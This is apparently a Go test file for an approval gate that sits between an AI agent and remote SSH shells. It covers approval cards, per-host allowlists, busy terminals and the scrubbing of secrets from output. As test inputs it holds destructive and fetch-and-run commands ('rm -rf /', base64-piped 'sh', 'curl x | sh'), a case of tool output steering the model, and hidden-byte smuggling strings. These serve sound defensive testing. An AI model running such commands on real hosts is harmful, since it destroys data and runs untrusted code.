package agentexec

import (
	"bytes"
	"context"
	"errors"
	"io"
	"regexp"
	"strings"
	"sync"
	"testing"
	"time"

	"hostbay/internal/apperr"
	"hostbay/internal/store"
	"hostbay/internal/terminal"
)

// shell is a fake remote shell: it records what is written to it, and the
// test says what it prints.
type shell struct {
	r   *io.PipeReader
	out *io.PipeWriter
	mu  sync.Mutex
	in  bytes.Buffer
}

func newShell() *shell {
	r, w := io.Pipe()
	return &shell{r: r, out: w}
}

func (s *shell) Read(b []byte) (int, error) { return s.r.Read(b) }
func (s *shell) Write(b []byte) (int, error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.in.Write(b)
}
func (s *shell) Resize(int, int) error { return nil }
func (s *shell) Close() error          { return s.r.Close() }

func (s *shell) got() string {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.in.String()
}

func (s *shell) say(text string) { s.out.Write([]byte(text)) }

var nonceIn = regexp.MustCompile(`'hostbay-done' '([0-9a-f]+)'`)

// finish prints the marker of the last envelope written, as the shell's
// printf would.
func (s *shell) finish(t *testing.T, code string) {
	t.Helper()
	m := nonceIn.FindAllStringSubmatch(s.got(), -1)
	if len(m) == 0 {
		t.Fatalf("no envelope was written: %q", s.got())
	}
	s.say("output\r\n" + string(marker(m[len(m)-1][1])) + code + "\aprompt$ ")
}

type rig struct {
	t   *testing.T
	reg *terminal.Registry
	e   *Executor

	mu      sync.Mutex
	info    map[string]TermInfo
	mode    string
	bypass  bool
	entries map[string][]store.AllowEntry
}

func newRig(t *testing.T) *rig {
	r := &rig{t: t, info: map[string]TermInfo{}, mode: store.AIConfirmAll, entries: map[string][]store.AllowEntry{}}
	r.reg = terminal.NewRegistry(func(string, string) {}, func(id, _ string) {
		r.mu.Lock()
		delete(r.info, id)
		r.mu.Unlock()
		r.e.TerminalClosed(id)
	})
	r.e = New(r, func(host string) Policy {
		r.mu.Lock()
		defer r.mu.Unlock()
		return Policy{Mode: r.mode, Bypass: r.bypass, Entries: r.entries[host]}
	})
	r.e.Wait = 2 * time.Second
	return r
}

func (r *rig) Info(id string) (TermInfo, error) {
	r.mu.Lock()
	defer r.mu.Unlock()
	i, ok := r.info[id]
	if !ok {
		return i, errors.New("closed")
	}
	return i, nil
}
func (r *rig) Write(id string, p []byte) error                     { return r.reg.Write(id, p) }
func (r *rig) Recent(id string) ([]byte, error)                    { return r.reg.Recent(id) }
func (r *rig) Subscribe(id string) (*terminal.Subscription, error) { return r.reg.Subscribe(id) }

func (r *rig) open(host string, sh Shell) (string, *shell) {
	s := newShell()
	id := r.reg.Open("owner", s)
	r.reg.Attach(id)
	r.mu.Lock()
	r.info[id] = TermInfo{HostID: host, Label: host + " (root)", Kind: "ssh", Shell: sh}
	r.mu.Unlock()
	r.t.Cleanup(func() { r.reg.Close(id) })
	return id, s
}

func (r *rig) set(fn func(r *rig)) { r.mu.Lock(); fn(r); r.mu.Unlock() }

type outcome struct {
	v   JobView
	err error
}

func (r *rig) run(target, cmd string) <-chan outcome {
	return r.runCtx(context.Background(), target, cmd)
}

func (r *rig) runCtx(ctx context.Context, target, cmd string) <-chan outcome {
	c := make(chan outcome, 1)
	go func() {
		v, err := r.e.Run(ctx, Request{Principal: "conv1", Target: target, Tool: "run_command", Command: cmd})
		c <- outcome{v, err}
	}()
	return c
}

// card waits for one pending request.
func (r *rig) card() Pending {
	r.t.Helper()
	for range 200 {
		if l := r.e.Approvals.List(); len(l) == 1 {
			return l[0]
		}
		time.Sleep(10 * time.Millisecond)
	}
	r.t.Fatalf("no approval card; pending %v", r.e.Approvals.List())
	return Pending{}
}

func (r *rig) noCard() {
	r.t.Helper()
	time.Sleep(50 * time.Millisecond)
	if l := r.e.Approvals.List(); len(l) != 0 {
		r.t.Fatalf("unexpected cards %+v", l)
	}
}

func get(t *testing.T, c <-chan outcome) outcome {
	t.Helper()
	select {
	case o := <-c:
		return o
	case <-time.After(5 * time.Second):
		t.Fatal("Run did not return")
	}
	return outcome{}
}

// envelopes counts the commands written to s.
func envelopes(s *shell) int { return len(nonceIn.FindAllString(s.got(), -1)) }

// runApproved approves cmd's card and lets it finish, leaving the
// terminal idle.
func (r *rig) runApproved(target string, s *shell, cmd string) {
	r.t.Helper()
	c := r.run(target, cmd)
	if err := r.e.Approvals.Answer(r.card().ID, true); err != nil {
		r.t.Fatal(err)
	}
	waitFor(r.t, func() bool { return strings.Count(s.got(), "eval") > 0 && nonceIn.MatchString(s.got()) })
	s.finish(r.t, "0")
	if o := get(r.t, c); o.err != nil || o.v.State != JobDone {
		r.t.Fatalf("%s = %+v, %v", cmd, o.v, o.err)
	}
}

func waitFor(t *testing.T, ok func() bool) {
	t.Helper()
	for range 300 {
		if ok() {
			return
		}
		time.Sleep(10 * time.Millisecond)
	}
	t.Fatal("timed out")
}

// AE15: on a fresh install nothing reaches the shell until the user
// approves; then the shell receives the envelope, whose payload is ls.
func TestConfirmAllAsksBeforeAnythingReachesTheShell(t *testing.T) {
	r := newRig(t)
	id, s := r.open("web", ShellPOSIX)
	c := r.run(id, "ls")
	card := r.card()
	if s.got() != "" {
		t.Fatalf("the shell got %q before approval", s.got())
	}
	if card.Bytes != "ls" || card.Size != 2 || card.Host != "web (root)" || card.Target != id || card.Expires.IsZero() {
		t.Fatalf("card = %+v", card)
	}
	if err := r.e.Approvals.Answer(card.ID, true); err != nil {
		t.Fatal(err)
	}
	waitFor(t, func() bool { return s.got() != "" })
	if got := payload(t, []byte(s.got())); got != "ls" {
		t.Fatalf("payload = %q", got)
	}
	s.finish(t, "0")
	o := get(t, c)
	if o.err != nil || o.v.State != JobDone || o.v.Exit == nil || *o.v.Exit != 0 || !strings.Contains(o.v.Output, "output") {
		t.Fatalf("result = %+v, %v", o.v, o.err)
	}
	if err := r.e.Approvals.Answer(card.ID, true); err == nil {
		t.Fatal("a request ID worked twice")
	}
}

// In dangerous-plus-write mode the first uptime on a terminal asks; after
// that job finishes with no keystroke since, the next runs without a card,
// and rm still asks.
func TestRelaxedModeRunsOnlyOnAnIdleTerminal(t *testing.T) {
	r := newRig(t)
	r.set(func(r *rig) { r.mode = store.AIDangerousWrite })
	id, s := r.open("web", ShellPOSIX)
	r.runApproved(id, s, "uptime")
	c := r.run(id, "uptime")
	waitFor(t, func() bool { return envelopes(s) == 2 })
	r.noCard()
	s.finish(t, "0")
	if o := get(t, c); o.err != nil || o.v.State != JobDone {
		t.Fatalf("second uptime = %+v, %v", o.v, o.err)
	}
	c = r.run(id, "rm -rf /tmp/x")
	card := r.card()
	r.e.Approvals.Answer(card.ID, false)
	if o := get(t, c); apperr.CodeOf(o.err) != apperr.ApprovalDenied || envelopes(s) != 2 {
		t.Fatalf("denied rm = %v, %d written", o.err, envelopes(s))
	}

	// A keystroke since the last job makes the next one ask: typed bytes
	// would land in whatever holds the terminal.
	r.reg.Write(id, []byte("git sta"))
	r.e.Keystroke(id)
	r.run(id, "uptime")
	r.card()
	if envelopes(s) != 2 {
		t.Fatal("uptime ran after a keystroke")
	}
}

// User entries are per host; with dangerous-only and an ls entry, a chained
// or expanded ls still asks.
func TestUserEntriesArePerHostAndFailClosed(t *testing.T) {
	r := newRig(t)
	r.set(func(r *rig) {
		r.mode = store.AIDangerousOnly
		r.entries["a"] = []store.AllowEntry{{Argv: []string{"ls"}, Prefix: true}, {Argv: []string{"systemctl", "restart", "nginx"}}}
	})
	a, sa := r.open("a", ShellPOSIX)
	b, sb := r.open("b", ShellPOSIX)
	r.runApproved(a, sa, "true")
	r.runApproved(b, sb, "true")
	for _, cmd := range []string{"ls; rm x", "ls && rm -rf ~", "ls $(rm x)", "echo cm0gLXJmIC8= | base64 -d | sh"} {
		c := r.run(a, cmd)
		r.e.Approvals.Answer(r.card().ID, false)
		get(t, c)
	}
	c := r.run(a, "systemctl restart nginx")
	waitFor(t, func() bool { return envelopes(sa) == 2 })
	sa.finish(t, "0")
	get(t, c)
	// The same entry does not reach host B, where focus moved.
	c = r.run(b, "systemctl restart nginx")
	r.e.Approvals.Answer(r.card().ID, false)
	if o := get(t, c); o.err == nil || envelopes(sb) != 1 {
		t.Fatalf("host B ran it: %v", o.err)
	}
}

// A proposal with a hidden byte is refused back to the model; no card.
func TestHiddenBytesAreRefusedWithoutACard(t *testing.T) {
	r := newRig(t)
	id, s := r.open("web", ShellPOSIX)
	for _, cmd := range []string{"ls\nrm -rf /", "ls\r", "ls \x1b[8m", "ls \u202erm", "ls\u200b"} {
		o := get(t, r.run(id, cmd))
		var ref *Refusal
		if !errors.As(o.err, &ref) {
			t.Fatalf("%q = %v", cmd, o.err)
		}
	}
	r.noCard()
	if s.got() != "" {
		t.Fatal("something was written")
	}
}

// While the agent's job still runs (sudo -i), the next command is refused
// with that job's state and nothing is written; the user answers the
// password prompt, the job finishes, and the terminal is idle again.
func TestABusyTerminalRefusesTheNextCommand(t *testing.T) {
	r := newRig(t)
	r.e.Wait = 200 * time.Millisecond
	r.set(func(r *rig) { r.mode = store.AIDangerousWrite })
	id, s := r.open("web", ShellPOSIX)
	c := r.run(id, "sudo ls")
	r.e.Approvals.Answer(r.card().ID, true)
	waitFor(t, func() bool { return envelopes(s) == 1 })
	s.say("[sudo] password for root: ")
	if o := get(t, c); o.err != nil || o.v.State != JobRunning || !strings.Contains(o.v.Output, "[sudo] password") {
		t.Fatalf("sudo = %+v, %v", o.v, o.err)
	}
	o := get(t, r.run(id, "uptime"))
	if !errors.Is(o.err, ErrBusy) || o.v.State != JobRunning || envelopes(s) != 1 {
		t.Fatalf("second command = %+v, %v", o.v, o.err)
	}
	r.noCard()
	// The user types the password; the agent has no tool to.
	r.reg.Write(id, []byte("hunter2\r"))
	r.e.Keystroke(id)
	s.finish(t, "0")
	waitFor(t, func() bool { v, _ := r.e.Output("conv1", o.v.ID, 0); return v.State == JobDone })
	c = r.run(id, "uptime")
	waitFor(t, func() bool { return envelopes(s) == 2 })
	r.noCard()
	s.finish(t, "0")
	get(t, c)
}

// An approved command runs on its frozen target; when that terminal closes
// before the answer, the request is cancelled and nothing runs anywhere.
func TestApprovalRunsOnItsFrozenTargetOrNowhere(t *testing.T) {
	r := newRig(t)
	a, sa := r.open("a", ShellPOSIX)
	_, sb := r.open("b", ShellPOSIX)
	c := r.run(a, "uptime")
	r.e.Approvals.Answer(r.card().ID, true)
	waitFor(t, func() bool { return envelopes(sa) == 1 })
	sa.finish(t, "0")
	get(t, c)
	if sb.got() != "" {
		t.Fatal("B got A's command")
	}

	c = r.run(a, "df -h")
	card := r.card()
	r.reg.Close(a)
	o := get(t, c)
	if o.err == nil || r.e.Approvals.Answer(card.ID, true) == nil {
		t.Fatalf("closed target = %v", o.err)
	}
	if envelopes(sa) != 1 || sb.got() != "" {
		t.Fatal("something ran after the target closed")
	}
}

// The connection drops during a run: the job's outcome is unknown, and the
// next command goes nowhere until a new terminal is the target.
func TestADroppedTerminalLeavesTheOutcomeUnknown(t *testing.T) {
	r := newRig(t)
	id, s := r.open("web", ShellPOSIX)
	c := r.run(id, "make install")
	r.e.Approvals.Answer(r.card().ID, true)
	waitFor(t, func() bool { return envelopes(s) == 1 })
	s.out.CloseWithError(io.ErrUnexpectedEOF)
	if o := get(t, c); o.err != nil || o.v.State != JobUnknown {
		t.Fatalf("dropped job = %+v, %v", o.v, o.err)
	}
	if o := get(t, r.run(id, "make install")); o.err == nil {
		t.Fatal("a command went to the closed terminal")
	}
}

// Stop withdraws a waiting card, and sends one Ctrl-C to a running job.
func TestStopWithdrawsTheCardAndInterruptsOnce(t *testing.T) {
	r := newRig(t)
	r.e.Wait = 100 * time.Millisecond
	id, s := r.open("web", ShellPOSIX)
	c := r.run(id, "uptime")
	r.card()
	r.e.Stop("conv1")
	if o := get(t, c); o.err == nil {
		t.Fatal("a withdrawn card ran")
	}
	r.noCard()

	c = r.run(id, "sleep 100")
	r.e.Approvals.Answer(r.card().ID, true)
	get(t, c)
	r.e.Stop("conv1")
	r.e.Stop("conv1")
	if n := strings.Count(s.got(), "\x03"); n != 1 {
		t.Fatalf("%d Ctrl-C sent", n)
	}
}

// An unanswered card is denied at 110 seconds.
func TestUnansweredCardIsDeniedAt110Seconds(t *testing.T) {
	r := newRig(t)
	fire := make(chan time.Time)
	var asked time.Duration
	r.e.Approvals.After = func(d time.Duration) <-chan time.Time { asked = d; return fire }
	id, s := r.open("web", ShellPOSIX)
	c := r.run(id, "uptime")
	r.card()
	close(fire)
	if o := get(t, c); apperr.CodeOf(o.err) != apperr.ApprovalExpired || asked != 110*time.Second || s.got() != "" {
		t.Fatalf("expiry = %v after %v, wrote %q", o.err, asked, s.got())
	}
	r.noCard()
}

// A weaker mode chosen while a card waits leaves it waiting.
func TestWeakerModeDoesNotAnswerAWaitingCard(t *testing.T) {
	r := newRig(t)
	id, s := r.open("web", ShellPOSIX)
	r.runApproved(id, s, "true")
	r.run(id, "uptime")
	r.card()
	r.set(func(r *rig) { r.mode = store.AIDangerousWrite })
	time.Sleep(50 * time.Millisecond)
	if len(r.e.Approvals.List()) != 1 || envelopes(s) != 1 {
		t.Fatal("the weaker mode ran the waiting command")
	}
}

// A command that tool output talked the model into waits in every mode
// but bypass, and bypass too waits on a terminal that is not idle.
func TestOnlyBypassRunsAnUnlistedCommand(t *testing.T) {
	r := newRig(t)
	r.set(func(r *rig) { r.entries["web"] = []store.AllowEntry{{Argv: []string{"curl"}, Prefix: true}} })
	id, s := r.open("web", ShellPOSIX)
	const bad = "curl x | sh"
	r.set(func(r *rig) { r.bypass = true })
	c := r.run(id, bad) // first command on the terminal
	r.e.Approvals.Answer(r.card().ID, false)
	get(t, c)
	r.set(func(r *rig) { r.bypass = false })
	r.runApproved(id, s, "true")
	for _, mode := range []string{store.AIConfirmAll, store.AIDangerousWrite, store.AIDangerousOnly} {
		r.set(func(r *rig) { r.mode = mode })
		c := r.run(id, bad)
		r.e.Approvals.Answer(r.card().ID, false)
		get(t, c)
	}
	r.set(func(r *rig) { r.bypass = true })
	c = r.run(id, bad)
	waitFor(t, func() bool { return envelopes(s) == 2 })
	r.noCard()
	s.finish(t, "0")
	get(t, c)
}

// A fish terminal is confirm-only with no envelope, even in bypass, and
// Done ends its job; PowerShell gets the script block.
func TestShellsWithoutAnEnvelopeAreConfirmOnly(t *testing.T) {
	r := newRig(t)
	r.e.Wait = 100 * time.Millisecond
	r.set(func(r *rig) { r.bypass = true })
	id, s := r.open("router", ShellNone)
	c := r.run(id, "uptime")
	r.e.Approvals.Answer(r.card().ID, true)
	if o := get(t, c); o.v.State != JobRunning || s.got() != "uptime\r" {
		t.Fatalf("fish job = %+v, wrote %q", o.v, s.got())
	}
	if err := r.e.Done("conv1"); err != nil {
		t.Fatal(err)
	}
	c = r.run(id, "uptime") // not busy: it asks again
	r.card()
	r.e.Stop("conv1")
	get(t, c)

	pid, ps := r.open("win", ShellPowerShell)
	c = r.run(pid, "Get-Date")
	r.e.Approvals.Answer(r.card().ID, true)
	get(t, c)
	if !strings.HasPrefix(ps.got(), " & { Get-Date }; Write-Host") {
		t.Fatalf("PowerShell got %q", ps.got())
	}
}

// The model picks read_output's offset. Cutting the raw output there, or
// at the screen tail's edge, before scrubbing leaves a secret that
// straddles the cut unmatched, so its rest would reach the provider.
func TestOutputIsScrubbedBeforeItIsCut(t *testing.T) {
	const secret = "Zq9-hunter2pw-Secret"
	r := newRig(t)
	r.e.Secrets = func(string) []string { return []string{secret} }
	id, s := r.open("web", ShellPOSIX)
	c := r.run(id, "cat config")
	r.e.Approvals.Answer(r.card().ID, true)
	waitFor(t, func() bool { return envelopes(s) == 1 })
	s.say("pw: " + secret + " ok\r\n")
	s.finish(t, "0")
	o := get(t, c)
	if o.err != nil || strings.Contains(o.v.Output, secret) {
		t.Fatalf("run = %q, %v", o.v.Output, o.err)
	}
	at := strings.Index(o.v.Output, "pw: ") + len("pw: ") + 1
	v, err := r.e.Output("conv1", o.v.ID, at)
	if err != nil || strings.Contains(v.Output, secret[1:]) {
		t.Fatalf("read from %d = %q, %v", at, v.Output, err)
	}
	s.say(secret + strings.Repeat("x", 16<<10-len(secret)+1))
	waitFor(t, func() bool { b, _ := r.reg.Recent(id); return bytes.HasSuffix(b, []byte("xxxx")) })
	if tail, err := r.e.ScreenTail(id); err != nil || strings.Contains(tail, secret[1:]) {
		t.Fatalf("screen tail holds part of the secret: %v", err)
	}
}
